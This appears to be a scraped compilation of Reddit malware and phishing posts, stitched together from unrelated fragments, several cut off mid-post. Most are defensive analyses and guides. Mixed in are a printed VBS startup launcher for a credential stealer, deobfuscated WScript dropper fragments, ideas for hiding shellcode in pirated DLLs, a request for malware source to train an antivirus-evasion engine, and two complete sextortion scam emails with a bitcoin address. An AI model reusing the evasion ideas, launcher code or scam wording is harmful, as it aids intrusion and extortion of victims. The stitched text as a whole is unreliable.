* **LSASS Memory** (T1003.001): So many ways an actor can implement this, so multiple layered detections are best. Lots to choose from, there are a whopping [60+ Sigma analytics](https://app.tidalcyber.com/technique/ab0da102-5a14-42b1-969e-5d3daefdf0c5-LSASS%20Memory) mapped to this
* **Registry Run Keys / Startup Folder** (T1547.001): Also many ways to carry this out but also many public analytics (20), and Atomic tests (9)
* **Scheduled Task** (T1053.005): A perpetual technique used by [40+ groups and almost 90 software](https://app.tidalcyber.com/technique/723c6d51-91db-4658-9ee0-eafb953c2d82-Scheduled%20Task) defined in ATT&CK. Also lots of ways to detect and test this activity. Pivot to source articles to see the ransomwares' implementations, but also worth checking capabilities against other variations
* **Windows Service** (T1543.003)
* **DLL Side-Loading** (T1574.002): Another technique used by a ton of actors & malware recently, including initial access & loader tools like QakBot
* **Token Impersonation/Theft** (T1134.001)
* **Cached Domain Credentials** (T1003.005): Only used by one of the ransomware here but this one is fun to test - crazy how easy it can be to dump credentials sometimes. Plus yours truly wrote the [only Atomic](https://app.tidalcyber.com/capability/f97b5699-0bb0-4717-915c-2ce5e8e5e451-Cached%20Credential%20Dump%20via%20Cmdkey) for this :)
* **Disable or Modify System Firewall** (T1562.004): Many of the techniques that involve [disabling](https://app.tidalcyber.com/technique/e3be3d76-0a36-4060-8003-3b39c557f728-Impair%20Defenses) or [tampering with](https://app.tidalcyber.com/technique/fc34e661-55c3-47be-a368-c2f5776cdd17-Clear%20Windows%20Event%20Logs) security tools or logging are great candidates for ransomware detection.

A few weeks ago I made [a post here](https://www.reddit.com/r/Malware/comments/xeoo5g/novel_pdf_malware_injecting_javascript_into_the/) about a PDF that evaded all malware detection and caused a security breach, almost certainly through PDF instructions hidden inside of an Adobe Type1 Font binary stream embedded within a PDF. At the time I posted a link to a tool I wrote called [The Pdfalyzer](https://github.com/michelcrypt4d4mus/pdfalyzer) that diagrams a PDF's internal and scans for various suspect content.

While I still have not figured out the exact mechanism behind that PDF which apparently opened a backdoor on one of the machines on my network, I have been hacking away at it. I added all the malicious PDF YARA rules I could find to The Pdfalyzer and also wrote [a new YARA rule to detect the suspicious bytes](https://github.com/michelcrypt4d4mus/pdfalyzer/blob/master/yara/PDF.yara#L903-L920) I identified in that PDF. I found myself wanting a way to extract certain kinds of quoted byte sequences and analyze them. In particular I was hunting through the binaries for quoted bytes (bytes between ' and "" chars), guillemet quoted bytes (the kind the PDF specification uses), and *especially* anything that could be a regular expression (between / chars in Javascript) that might be used to decode other parts of the binary.

Long story short I ended up realizing that I could use YARA as a generic backend matching engine to locate these and other byte patterns and a couple of python libraries to try to detect the character encoding and/or force encodings of my choice upon the matched bytes. I ended up extracting the binary regex/YARA match/force decode part of The Pdfalyzer into a new tool that just does the matching/decoding part, which I called [The Yaralyzer](https://github.com/michelcrypt4d4mus/yaralyzer).

Here's a screenshot of the output when matching the regex `/(.*?)/` (a regex to find potential regexes). The highlighted parts are the actual matches and the grey parts are the bytes before and after the match.  The before/after was a thing I wanted to inspect that YARA couldn't easily produce.

1459525389.0,lnkr.us Re-Direct Malware Report,"I came across some malware today while browsing Reddit and did some research. My browser was redirecting the links that I clicked on to something like the following: 

        https://lnkr.us/get?sourceId=5&uid=50639x1409x&format=go&host=icontent.us&out=https%3A%2F%2Fwww.washingtonpost.com%2Fnews%2Fthe-watch%2Fwp%2F2016%2F01%2F29%2F80-percent-of-chicago-pd-dash-cam-videos-are-missing-audio-due-to-officer-error-or-intentional-destruction%2F%3Fpostshare%3D7901454147211893%26tid%3Dss_fb&ref=https%3A%2F%2Fwww.reddit.com%2Fr%2Fnews""
        

And then it would re-direct the browser again from the above link to an advertised website that they probably had on a list. uBlock Origin luckily halted both redirects. If you want to go and hack the hackers and test for an insecure redirect/forward on them, I wont tell you no, but I'm not going to do it.

This only happened probably around 50% of the time I clicked an HTTP link.

An extension that I've been using called Better History is infected with this ""lnkr.us"" redirect malware since March 23rd.
        
A review from the store page says: ""One star until shady permissions are verified, and there is outdated content on github and the twitter feed. it would appear this extension has been hijacked and could be used for nefarious purposes. I would think carefully before you install it.""

The version on github is 3.9.5, the version on the store page is 3.9.8. Definitely hijacked. The permission that clearly throws the red flag is that it can read and change all data on the websites you visit.

The newly added permissions in the manifest.json which was not posted to github: 

    ""http://*/*"", ""https://*/*"", ""idle"", ""webNavigation"", ""webRequest"", ""webRequestBlocking""

It also calls for a new script called ""common.js"". Common.js contains the following:

    if(localStorage)
    {
    	localStorage[""ipirat_isInstalled""] = true;
    }

Huh, weird eh?

ipirat seems to be a Russian proxy extension that gets installed on your machine and redirects you to the highest bidder occasionally.

1446436350.0,[Beginner] What did I find?,"For starters, I should point out that I'm a beginner with little software engineering skills. While I'm learning, I mostly rely on network forencis and high level process/OS activity for dynamic analysis. I downloaded this sample from malwr.com (link) as something to practice with and found something that I'm not really sure where to start with. 

**The make a quick summary of what I'm looking at:**

The file from the link is a dropped that performs and HTTP get request for gooogledownloadfree[.]net/config/bin.zip. 
This file is extracted into %appdata%\Roaming\NetworkService and drops several executable files, DLLs, and a CA certificate. The CA is moved to the trusted certs folder and seems to be used later for SSL MITM. A ""NetworkService"" service is created and points to one of the dropped exe's. This service opens a port 0.0.0.0:6666 , seemingly to serve as a mitm proxy. 

All traffic goes back to the same IP address the dropped grabbed its binaries from, under a different domain name: youtube4tr[.]com. There is a post to youtube4tr[.]com/api containing a sort of unique ID and some other info I havent figured out yet. 

    POST /api HTTP/1.1

**The interesting part(s):**

In poking around, I browsed to the c2 server and got a 404 error on the root directory. However, the /config directory is full of folders with date stamps. Each folder contains several .txt file with a name similar to the unique ID spotted in the aforementioned HTTP post. The text files look like they contain keystrokes or something, but nothing else. Most of the language seems either be Portuguese or Italian. Incidentally, I couldn't located any text files with my unique string.

In futher prodding, I found a list of domains registered by the registrant for original c2 domain (gooogledownloadfree[.]net). The registrant is Oasis Games and some of the other domains returned are: 


    85.195.110.142 	account.uumessenger.com
    85.195.110.142 	api.uumessenger.com

    85.195.110.166 	lotr.oasgames.com
    85.195.110.167 	lotr.oasgames.com

Some are no longer active, others I haven't looked into yet. However, gogledownload[.]net has another file index listing. Of particular interest is http://gogledownload[.]net/download/ which lists an executable 'GoogleMgr.exe'. 

I threw that one in the sandbox and this is where I'm totally lost. 
An HTTP connection is made back to the domain on port 4013. The stream fist send a login of some sort (not sure of encoding), then the client queries ipinfo.io and sends the returned json string (base64 encoded) to the server. 

An HTTP port 8787 is opened on the client, which I cannot connect to the life of me. Any attempt returns a 400 error with ""CallID:"" string appended as the error text. 

The exe spawns a cmd window but it isnt interactive it all, simply displays some info about the connection back to the server. (will screenshot if there's any interest). When an HTTP  request is made, it displays the HTTP packet in the console, but there is no response in the browser. 

Has anyone seen anything like this before? Is anyone interested in looking a bit further into this? Any advice for moving forward?

1670287586.0,Discord Malware Analysis,"Hi everyone!

A friend of mine was just infected with an intriguing discord malware, apparently the so-called ""bby stealer"". It stole his browser passwords, account and possibly some other details. This scratched that part of my head that lead me to spend my evening diving into reverse engineering it and find out who exactly I was dealing with.

Apparently this is a modified version of a quite popular [pirate stealer](https://github.com/Ralstof/bbystealer), but while I was excited to grab the webhook URL and play with the attacker that paid for this NodeJS script, I found out they actually route it through two URLs. I'm not yet exactly sure if they request this API to call a webhook URL, or if they pass the webook to the API. Nonetheless, I should be able to directly invoke it myself...

I ran Wireshark and was able to find out DNS requests to:

mdvksublbpczqluqvvbytfprxdwakuke\[.\]nl and socket\[.\]bby\[.\]gg

https://preview.redd.it/64v4aqxzc64a1.png?width=1826&format=png&auto=webp&s=1dcf5004bb63a67b63c5197881daea7f13b77ce6

Unfortunately, the application data was encrypted and my attempts to decrypt it were unsuccessful.

Also tried to view the `strings` in the executable but it seems highly obfuscated as I couldn't find any function even invoking a webhook or that URL.

This seems like a challenge and even though I hit a wall, I'm still investigating for alternatives that could help me gain access to the API to post some fun content on a discord channel somewhere.

I don't think I can directly post the sample here.

If anyone's bored and willing to provide an extra hand, I'm happy to share the executable file!

If you would like me to share it directly, just post a comment or DM me.[https://www.virustotal.com/gui/file/483c6b8bbe6ad389a7958440c66c2176c522647105049933545b4fafd9d33b64/detection](https://www.virustotal.com/gui/file/483c6b8bbe6ad389a7958440c66c2176c522647105049933545b4fafd9d33b64/detection)

**EDIT 2**: With the help of u/Trolling_turd and u/itsVermin we are able to narrow down the following findings:

* The Wireshark PCAP contains the DNS requests to the hosts but it doesn't seem to be possible to decrypt the traffic. It could possibly use the raw 443 port, but encrypt it in some other way.",Malware,2626,370,69,0

1495270278.0,Passionate Beginner with some questions.,"Hey guys,  
I know there's probably a post like this everyday asking how to become a Virus/Malware, ReverseEngineer Analyst, so if nobody replies I wont be too offended.  
&nbsp;  

I have done some researches on this subredit, and If anyone have the time to read through this and can help steer me in the right direction or perhaps let me know of something I may have missed while researching, please let me know!  
&nbsp;  

My Background:  
Not really a Programmer, but have learned a ltitle bit of Java back in the days in college.  
Have studied a little bit of Python through the book Automate the Boring Stuff (first half of the book)  
Have attempted to study some C++ a while back, but only gone through a few chapters.  
Overall, I'm not completely new to programming concepts, but at the same time I have never stuck long enough to really learn any language extensively or put them into a lot of practice.  
&nbsp;  

**Q1**. What Programming Language should I focus on? (ASM) Assembly? C? C++? I think one of the books below even teaches by using Python? The most important is probably Assembly right? But when do C or C++ come into play? Which should I start learning now? I actually don't mind learning Assembly as I've always been fascinatinted with it (especially after seeing how people from demoscene use it to create size-restrictive yet mindblowing visuals.) But should I also learn C or C++ too? How should I Prioritize these programming language? Which should be the primary, secondary,etc?  
&nbsp;  

Also, when it comes to these languages, what's the level of expertise that's required? I mean for something so complex and encompassing as C++, people can literally spend a lifetime and still discover new things about it everyday :D I'm guessing I should have a solid understanding of how programming works, its concepts, understanding memory usage, things such as buffer overflow, etc. Basically have a firm grasp of how programming works?  
&nbsp;  

**Q2**. From googling and searching this subredit, I've gathered and listed some of the resources people have been recommending. Books, Forums, IRC Chatrooms. Does anyone have any other recommendations by any chance?  
  
Are there any Virus/Malware researchers, groups,twitters, blogs that you follow religiously?  
Are there any Virus/Malware news,  tracking sites taht you check for keeping yourself informed?

1592070007.0,Repost due to false DMCA (Presumably by the person who created the script)," 

Hey, all,  A few days ago, I started getting weird pop-ups from very bizarre sites called IGCritic and PPCorn. I won't link to the sites directly as they've already had record levels of traffic as a result of this scam, but both of the links are weird old articles about cute animals. Strange, right?  I got in touch with a bunch of people who were having the same issue (which was surprisingly hard to do as this time 2 days ago there was basically nothing online about the problem) and we've been working in a Discord to isolate what's going on. Here's what we know:  - A scammer from a 'company‚Äô called extensionmetric.com  has been contacting the developers of popular extensions with an offer to pay them in exchange for adding a harmless looking and sounding analytics script. The scam is very credible-sounding, the site looks legit on first glance, and it's done over the phone (with an American accent).  - We've identified four Chrome extensions/apps which have been compromised:  1. Github Gloc 2. Chrome Currency Converter 3. Promoted Pin Hider 4. Notepad (the Chrome app)  - There are definitely more, we just don't know what they are yet.  


\- The code causes your browser to, at somewhat regular intervals, call up a series of bizarre sites which (using some kind of API thing which I don‚Äôt understand) redirect you to the sites in question. Sometimes to Google. The sites open in their own window (in the bottom-right of your monitor, I think) and are usually inaccessible. It opens behind everything else you have open.   - I can go into more detail if you‚Äôre interested, but the mechanism of how the scammer is profiting from this is a little obscure to us at this stage. It‚Äôs hard to know what the vector of the scam is, but it doesn‚Äôt take much imagination to realise that the ability for an extension to consistently open windows without your permission isn‚Äôt great.  - If you‚Äôve got any of these extensions, uninstall them. You‚Äôre gonna be redirected to a page called NativeAutomation when you do--this is part of the code the scammer has had added to the extensions. I recommend deleting the cookies which you get from this site for obvious reasons.  We‚Äôve been doing a lot of digging, but we still don't know the full extent of what the malicious code is doing. The guy perpetrating this scam was previously investigated by the FBI for a similar crime  about a decade ago in which he tried to sell half a million dollars of data to a company which reported him to the FBI.

1551099616.0,Malware De-obfuscation technique,"I have been doing malware analysis recently. From the readings, I learnt that common way to obfuscate a malware is :

1.Register swap

2.Sub-routine re-ordering

3.Dead code insertion

4.Instruction substitution

5.Transposition of independent code

Hence, my doubts are:

1. Am I missing some obfuscation technique?
2. Is there any way to de-obfuscate (say dead code removal) the malware(specific to PE files) for better analysis ? (I guess there wont be any concrete approach, may be some heuristic approach )

1548506115.0,How feasible is it to hide malicious code in pirated software?,"As a thought experiment I was thinking about how feasible it would be to hide malicious code inside a pirated software. Most people just assume malicious content would be only hidden in .exe files and as a result they only upload the main PE file to online virus scan sites if they suspect anything and if it comes clean they assume it should be okay. But on the other hand you can also modify the .dll files and add your malicious shellcode inside a code cave or you could just make a new wrapper dll around the original dll (like a packer) and run your malicious code in the entry point and then transfer execution to the original dll's entry point and so on. I am sure there are lots of other methods, these are just off the top of my head.

I'll be honest, I do pirate software especially with video games since demos are rare these days and I don't want to financially support some of the developers because of mispractices. And for some other professional software that requires 1000 - 3000$ per year but you don't have that kind of money yet and that particular software is the de-facto solution for that particular problem and the alternative FOSS software is just a crippled mess.

What makes it especially scary is the fact that still a lot of users pirate software constantly. Some are broke, some have political reasons, some because it is free so why the hell not, and some a little bit of everything. With some popular software you can have like 1-3k downloads in a single day for a single release, even more. If you are smart and you do things like delayed execution with random jitter or monitoring file system for user initiated software execution and then delivering your payload you can minimize/redirect suspicion for the campaign. And if you are able to lie and craft a long term fake persona such as ""Bill the Friendly Pirate Guy Who Brings You Otherwise Expensive-and-Hard-To-Find Software for Free"" you are just solid. The only possible threat is ""that guy"" who knows .dll files are also PE files and will reverse-engineer your binary to prove everyone you are an a**hole but for some reason he still pirates stuff even though he knows that he shouldn't exactly for these reasons.

1470095000.0,New malware going around: AntiUsb and AntiUsbShortcut,"Hi folks

Currently clearing out some malware from the PCs at work; something that showed up back in May this year but hasn't been reported 'til recently. 

Has anyone here encountered something called AntiUsb or AntiShortcut (or some other variation on the name)? It's a pair of hidden folders in the Windows install directory that both have the same contents: an executable file called AntiUsb.exe, an executable WinZip file called AntiUsbShortcut.zip, and two shortcuts that point to the other two files.  
These folders also clone themselves onto the root directory of any other local disks and any removable drives that are plugged in. 

All I've been able to discern from it so far is that it goes through top-level directories and creates shortcuts that seem to just loop back onto the folders they were created in, but when I delete them the confirmation dialog box says it points to System32\cmd.exe. Given that AntiUsb.exe is almost 1MB in size and AntiUsbShortcut.zip is 3.5MB, I'm hesitant to believe that that's *all* it's doing, but I can't see it doing anything else. 

I killed the running process AntiUsb.exe, then deleted the folders, but after rebooting they were back. I had a look through the registry and found some persistence entries that were restoring them upon shutdown/restart. Cleared those out, then deleted folders again, then manually deleted every rogue shortcut I could find.

I need to get the source code of roughly 200 to 500 different malwares, written in C for windows x86. As part of a research project I am trying to develop an engine that utilizes deep reinforcement learning to make malware antivirus evasive. Does anybody here has a collection of C malware or knows where I could find those? The malware will be converted to x86 assembly where I will work on them then. Why C? Because I made the experience that it is the language that can be converted to assembly the easiest using GCC. In addition to that it is next to impossible to find malware that is directly written in assembly.

&#x200B;

What is my intention?

I want to work on x86 assembly and make small automated non-function changes to the assembly and compile it so that it can trick static analysis into thinking that the malware is a benign program.  I intend to utilize deep reinforcement learning for that and compare the the results with random addition of non-functional changes. So I can see if it is reasonable to use Deep RL instead of just adding random non-functional changes to the assembly.

Tbf I just need the assembly of binaries which are flagged by static analysis. It does not even need to be malware. But in my experience, it is even harder to find the source of benign programs that are falsey flagged as malicious.",Malware,1343,240,18,0

But the book is pretty old now, it doesn't really cover anything that happened after Windows XP. I would like to learn more about the topics not covered in this book. I'm thinking ransomware, malicious documents, security techniques since Vista (like ASLR) and how it changed malware.

The URL associated with the file is: http ://get.download2desktop.com/DownloadManager/Get?p=7302&d=1775&l=1694&n=0&d1=13409&clickid=835160861, http ://downloads.giochimobi.com/FPlayer/UK/auload.html?installer=Flash_Player_13_for_Other_Browsers&browser_type=KHTML&dualoffer=false

The file didn't execute, and I'm on a Mac. But I was wondering whether anyone has seen this before, and whether there is somewhere sensible to report this. I've retained a copy of the file.

Oddly enough the same thing happened four times, but now the page appears to display correctly. Possibly a compromised advert?

Comprised of a variety of tools, the main one I think would interest this group is the ""Deep File Inspection"" (DFI) component. The current iteration is restricted to parsing malicious document droppers. Capable of extracting embedded logic, metadata, semantic information (including OCR over embedded images), and a variety of artifacts. A sample pool of over 500,000 samples is available for search and download. Note that this dataset is growing daily.

The impetus behind the release of this tool/data is to empower researchers to search for and discover interesting malware lures. This is the primary data source behind our Blackhat talk:

1542224273.0,Malware Anti-Forensics Project: Industrial Collaboration,"For part of my doctoral research I am planning to do a mini-project as part of my phd at Oxford university.

&#x200B;

The proposed mini-project is an analysis of anti-forensic or anti-VM techniques within malware samples.

The dates for which the project would be effective would be from:

8/7/19 ‚Äì 6/11/19

&#x200B;

This paper would then likely¬†be submitted as part of a doctoral thesis, but also ideally as an independent paper submitted to conferences, it would definitely be published as part of the cybersecurity department's technical paper series (the cybersecurity institute here at the university).

&#x200B;

There would also be optional co-authorship available for the collaborating analyst or analysts.

This research would be conducted with the academic supervision of respected academic authors in the field.

I've had 2 wallets emptied. Also steam accounts have been compromised, so i certain sensitive information was collected. I'm also certain the theft and the malware are related. They(wallets) were used on 2 separate windows (one of them w7 and other w10) machines, and I have found running on both of them strlen32.exe process which seemed suspicious. Looked into msconfig->startup and found a ""HWID suspect instalation.vbs"" was launching it. These are it's contents :
Set akKbamMzFnyDtynb = CrEAtEObJeCt(""wSCRIPT.shell"")
AKkbammzFNYDTYNb.RUn """"""C:\Users\whateveruser\AppData\Roaming\HWID suspect install\strlen32.exe""""""

As you can see 22/56 (all the very good ones included) found it harmful.
I've tried starting the application in question (on the already infected w10 machine) and analyzing through wireshark if it sent any packets over the network but my lack of knowledge using wireshark got me to a dead end.
I've also tried disassembling it with various tools such as ht editor, ollydbg and others but also reached a dead end as the ASCII code seems encoded.
My idea was to find where it sent the data(if it did). Or could it be that it installed some kind of meterpreter?
There is a chance maybe the events are unrelated, but i doubt it.
Any suggestions on how to proceed are welcome.
Thank you and have a great day.

The file being there in the first place made me a bit suspicious of it, but then I saw the first size. It was 8MB in size, and that's quite large for a keygen, right?

I stuck it in my VM and ran it, and kept an eye on taskmgr. Not much happened, a keygen looking ui came up, then disappeared.  Shortly after, everything on my desktop turned into whatever.extension.tc. I tried opening them in Notepad++ and it all came up weird...

1549887376.0,Visual Analysis with ProcDOT (X-Post),"Good morning,

I've just released ""Visual Analysis with ProcDOT"", the latest episode in the ""Introduction to Malware Analysis"" series, covering a neat utility called ProcDOT. As you are likely aware, Sysinternals‚Äô Process Monitor, also known as Procmon, in combination with PCAP data provides a treasure trove of information that is commonly used in behavioral malware analysis. The problem is, data from those sources is disparate, and typically manual analysis is required to correlate process-related information from Procmon with the corresponding network-related activity derived from the packet captures. What if there was a utility that did that for us, AND presented the results in an interactive, visual format? Enter ProcDOT.

1515107842.0,Noob Question: How do p2p botnets get stolen info back to the attacker without a centralized server?,"There were many well known p2p botnets like Zeus, ZeroAccess, Storm and Agobot over the years. The way I understand it, there are some victim nodes that contact a bunch of other computers and that forms the botnet.

I just don't know how the attacker is to get the data. If the data is stored on the node, what if it goes offline? Then wouldn't they miss out on a bunch of stolen data.

Perhaps it has nothing to do with being stored on the victim, and the malware just sends it to a dropzone or email or something?

Any explanation would be greatly appreciated.

So today I got the first spam email within month and it even had a zip file attached. ( Thats actually it, no body, no subject)   
Being very curious about what this file called ""INFO_387381851_myfirstname"" is I immediately started my shitty 300mb RAM Debian box and after 5min of intense booting logged in and downloaded it. Taking a look inside the zip I found... another zip file  (Someone probaly thought It'll compress it even more ^^ )   

The second zip is called ""MONEY_28966_ZIP.zip"", heck - is that nigerian prince finally sending me my money back?   
I guess not, in there is just a single .js file. At this point I expected some executable with a sneaky hideous name... but just a js file was kinda dissapointing.  
Opening it up only revealed some thoroughly obfuscated JavaScript code:
http://hastebin.com/sijexegoqo.sm  
Deobfuscating this manually was only considered for a fraction of a second after looking at it so I just ended up pushing it through some online deobfuscators. After all, I couldn't even run it. But the furthest they got was:
`0. return upvuqab[idwunharg].pop  `  
`1. return 'Scripting.FileSystemObject';`  
`2. var ahcicx = WScript.CreateObject(puxijug6); var rezlime31 = ahcicx.GetFileVersion('C:\\\\Windows'); if(rezlime31 == '') return true;`  
`3. TypeError: WScript.CreateObject is not a function`  
  

As it turns out, the script is trying to use WScript which is according to my research an object provided by the W/CScript.exe hosts so I probably had to use Windows's MSHTA.exe to even run the thing.  
Unfortunately im on a Mac. I really wan't to know what it's doing tho...

1472651756.0,Analyzing Shellcode,"Hey guys, Wanted some advice with this sample I came across in the wild.



Got an email with a RTF document attachment called ""WireTransfer.doc"" which is actually just an RTF.



Here is a pastebin of the HEX of the file. As you can see it looks like it contains shellcode:
http://pastebin.com/u8Ykp48k



I dumped it into an online tool for identifying shellcode in documents called (cryptam.com) and it recognized the following shellcode exploits:



exploit.office RTF MSCOMCTL.OCX RCE CVE-2012-0158



During dynamic analysis, running the file in my VM it launches MS Word and then instantly throws an exception ""There is not enough memory or disk space to complete the operation"". And then nothing else happens. So it looks like the shellcode is throwing the exception but then there is no ""payload"" that it does aftwards? Making me think the file file is somehow incomplete or missing parts to it.



But the thing I am trying to determine is WHAT the shellcode actually does. I am trying to use various tools to Convert Shellcode to EXE's or to assembly instructions but nothing has been working. I am not sure exactly WHAT part of the file is shellcode, as in where it starts and stops within the file.



Could anyone point me in the right direction here or give me advice on how/what tools they use to analyze shellcode like this?

1436483094.0,Tron v6.3.9 (2015-07-09) // Adobe Flash update; Sub-tool updates,"##Background

Tron is a script that ""fights for the User""; basically automates a bunch of scanning/disinfection/cleanup tools on a Windows system. I got tired of running these utilities manually and decided to just script the whole thing. I hope this helps other techs and admins.

----------------------------------------

##Stages of Tron:

0. **Prep**: `rkill`, `ProcessKiller`, `TDSSKiller`, `Stinger`, `registry backup`, `WMI repair`, `sysrestore clean`, `oldest VSS set purge`, `create pre-run System Restore point`

1. **Tempclean**: [TempFileCleanup](http://www.reddit.com/r/usefulscripts/comments/33grs0/batch_tempfilecleanup/), `CCLeaner`, `BleachBit`, `backup &amp;amp; clear event logs`, `Windows Update cache cleanup`, `Internet Explorer cleanup`, `USB device cleanup`

2. **De-bloat**: remove OEM bloatware; customizable list is in `\resources\stage_3_de-bloat\oem\`; Metro OEM debloat (Win8/8.1/2012 only)

3. **Disinfect**: `RogueKiller`, `Kaspersky Virus Removal Tool`, `Sophos Virus Removal Tool`, `Malwarebytes Anti-Malware`, `DISM image check (Win8/2012 only)`

4. **Repair**: `Registry permissions reset`, `Filesystem permissions reset`, `SFC /scannow`, `chkdsk` (if necessary)

5. **Patch**: Updates 7-Zip, Java, and Adobe Flash/Reader and disables nag/update screens (uses some of our [PDQ packs](http://www.reddit.com/r/sysadmin/comments/32q0in/pdq_deploy_packs_v300_20150415/)); then installs any pending Windows updates

6. **Optimize**: page file reset, defrag `%SystemDrive%` (usually C:\; skipped if system drive is an SSD)

7. **Wrap-up**: Send job completion email report (if configured; specify SMTP settings in `\resources\stage_7_wrap-up\email_report\SwithMailSettings.xml`

8. **Manual stuff**: Additional tools that can't currently be automated (`ComboFix`, `AdwCleaner`, `aswMBR`, `autoruns`,  etc.)

Saves a log to `C:\Logs\tron.log` *(configurable)*.

3. Third method: Script only

    The master script is available **[here on Github](https://github.com/bmrf/tron/blob/master/tron.bat)** (Note: this is *only* the script and doesn't include the utilities Tron relies on to function).

---------------------------------------------------

##Command-Line Support

Tron has full command-line support. All flags are optional, can be combined, and override their respective script default when used.

    Usage: tron.bat [-a -c -d -e -er -gsl -m -o -p -r -sa -sb -sd -se -sp -sfr -spr -srr -sw -v -x] | [-h]

    Optional flags (can be combined):
     -a   Automatic mode (no welcome screen or prompts; implies -e)
     -c   Config dump (display current config. Can be used with other
          flags to see what WOULD happen, but script will never execute
          if this flag is used)
     -d   Dry run (run through script without executing any jobs)
     -e   Accept EULA (suppress display of disclaimer warning screen)
     -er  Email a report when finished. Requires you to configure SwithMailSettings.xml
     -gsl Generate summary logs. These specifically list removed files and programs
     -m   Preserve OEM Metro apps (don't remove them)
     -np  Skip the pause at the end of the script
     -o   Power off after running (overrides -r)
     -p   Preserve power settings (don't reset power settings to default)
     -r   Reboot automatically (auto-reboot 30 seconds after completion)
     -sa  Skip anti-virus scans (MBAM, KVRT, Sophos)
     -sb  Skip de-bloat (OEM bloatware removal; implies -m)
     -sd  Skip defrag (force Tron to ALWAYS skip Stage 5 defrag)
     -se  Skip Event Log clearing
     -sp  Skip patches (do not patch 7-Zip, Java Runtime, Adobe Flash or Reader)
     -sfr Skip filesystem permissions reset (saves time if you're in a hurry)
     -spr Skip page file reset (don't set to ""Let Windows manage the page file"")
     -srr Skip registry permissions reset (saves time if you're in a hurry)
     -sw  Skip Windows Updates (do not attempt to run Windows Update)
     -v   Verbose. Show as much output as possible. NOTE: Significantly slower!
     -x   Self-destruct. Tron deletes itself after running and leaves logs intact

    Misc flags (must be used alone):
     -h   Display this help text

---------------------------------------------------

##Integrity

`checksums.txt` contains SHA-256 checksums for every file and is signed with [my PGP key](http://pool.sks-keyservers.net:11371/pks/lookup?op=get&amp;amp;search=0x07D1490F82A211A2) (0x07d1490f82a211a2; pubkey included). You can use this to verify package integrity.

Please suggest modifications and fixes; community input is helpful and appreciated.

1603478725.0,"I clicked on a link, what do I do?!? - Check here first.","One of the most common questions posted here is what to do if you've clicked on a phishing link. This short guide is intended to help with these questions and what to do if you've clicked on a phishing link.

**DO NOT ENTER ANY CREDENTIALS OR LOGIN DETAILS FOR ANYTHING IF YOU'VE CLICKED ON A MALICIOUS LINK.**


1. Links are generally not malicious on their own. While clicking on any unknown links can be dangerous it is difficult to design a phish that works just by clicking the link. Most links take you to a (usually fake) page that will ask for certain credentials. As long as you closed the page after you clicked the link you're *probably* fine, but it's still a good idea to change your password for whatever service the phishing link was trying to access (such as amazon).

2. If you clicked a link that downloaded a file, delete the file. Generally these files aren't harmful unless opened after downloading.

3. If you've clicked a phishing link and have provided credentials to a service, change the password for that service. Say you've been tricked into giving someone your Amazon credentials. Go to Amazon.com directly and change your password. Also, check the ""third-party account access"" section of your commonly used websites. Often phishing links and malicious services will try to authorize themselves to your account rather than outright stealing your credentials.

4. When logging into websites with sensitive information such as a bank it's best to bookmark the site and visit the site directly each time from that bookmark. That way you know that the website you're using is the real one.

5. **ENABLE 2FA (TWO FACTOR AUTHENTICATION)** This is perhaps the best thing you can do to protect your sensitive accounts. All websites that deal with sensitive information will allow you to use either your phone number or an authentication app (I like Authy) to generate one-time login codes to further secure your account. Unless someone gets your credentials and your 2FA device (your phone) they won't be able to access your account.

6. **Please** use a password manager of some sort. This will allow you to use strong and unique passwords for each site you use. If one of your accounts is hacked or phished all of your other accounts will be safe with unique passwords (unless your email was hacked/phished).
7. Ensure you have a backup email and/or phone number connected to your primary email account so that you can recover access if you're locked out. Additionally, make sure your recovery methods are as secure as your primary email login.",phishing,2567,436,51,1

1535491930.0,"""Youtube Video Downloader"" Firefox add-on injecting malicious JavaScript everywhere","I have been doing some web development on my local computer, and noticed on Firefox's dev tools a request to some JavaScript file on Amazon S3. I beautified the code and a quick glance revealed stuff totally unrelated to downloading YouTube videos; attempts at modifying Facebook, Amazon, Google search results, etc. on the fly. I immediately started disabling Firefox extensions one by one until the phishing request disappeared.

The culprit was a Firefox add-on, [""Youtube Video Downloader Ultimate 1.2""](https://imgur.com/cpn3mo5), which I completely forgot I had even installed. I have checked that at least Facebook (thankfully) disables cross-origin requests, so the script does not even load. I suspect Amazon et al have the same kind of protection.

They are all MailTo links, clicking on them opens a new mail, addressed to `unusual.activity@recognized-sec.com`. A quick google search told me that this site ""recognized-sec.com"" is not safe, so I didn't open it. If I have to guess, it must be trying to mimic ""sec.gov"" or ""sec.com"".

I did see a bunch of failed login attempts (Probably by using an old password from some hacked accounts DB), but no successful login from Russia.

So I am more inclined to believe that its a fraudulent email, trying to phish/bait me. But how a MailTo link will do it? If I clicked on the link, it will simply open a new email in my email client. So what's going on here, I'm confused.

After the transaction is successful, I will proceed to delete everything without delay.

Lets get directly to the point.  
Not one person has paid me to check about you.  


You do not know me and you're probably thinking why you are getting this email?  


in fact, i actually placed a malware on the adult vids (adult porn) website and you know what, you visited this site to experience fun (you know what i mean).  


When you were viewing videos, your browser started out operating as a RDP having a key logger which provided me with accessibility to your display and web cam.  


immediately after that, my malware obtained every one of your contacts from your Messenger, FB, as well as email account.  
after that i created a double-screen video. 1st part shows the video you were viewing (you have a nice taste omg), and 2nd part displays the recording of your cam, and its you.  


Best solution would be to pay me $1014.  


We are going to refer to it as a donation. in this situation, i most certainly will without delay remove your video.  


My -BTC -address: 37n2br6njszaYRXsW6GWDDD7GD2yhT1DP8  


\[case SeNSiTiVe, copy & paste it\]  


You could go on your life like this never happened and you will not ever hear back again from me.  
You'll make the payment via Bitcoin (if you do not know this, search 'how to buy bitcoin' in Google).  


if you are planning on going to the law, surely, this e-mail can not be traced back to me, because it's hacked too.  


I have taken care of my actions. i am not looking to ask you for a lot, i simply want to be paid.  
if i do not receive the bitcoin;, i definitely will send out your video recording to all of your contacts including friends and family, co-workers, and so on.  


Nevertheless, if i do get paid, i will destroy the recording immediately.  


If you need proof, reply with Yeah then i will send out your video recording to your 8 friends.  


it's a nonnegotiable offer and thus please don't waste mine time & yours by replying to this message.

I am a hacker, and I have successfully gained access to your operating system.
I also have full access to your account.

When I hacked into your account, your password was: ******

I've been watching you for a few months now.

The fact is that your computer has been infected with malware through an adult site that you visited.
If you are not familiar with this, I will explain.
Trojan Virus gives me full access and control over a computer or other device.
This means that I can see everything on your screen, turn on the camera and microphone, but you do not know about it.
I also have access to all your contacts and all your correspondence.

Why did your antivirus not detect malware?
Answer: The malware I used is driver-based, I update its signatures every 4 hours. Hence your antivirus is unable to detect its presence.
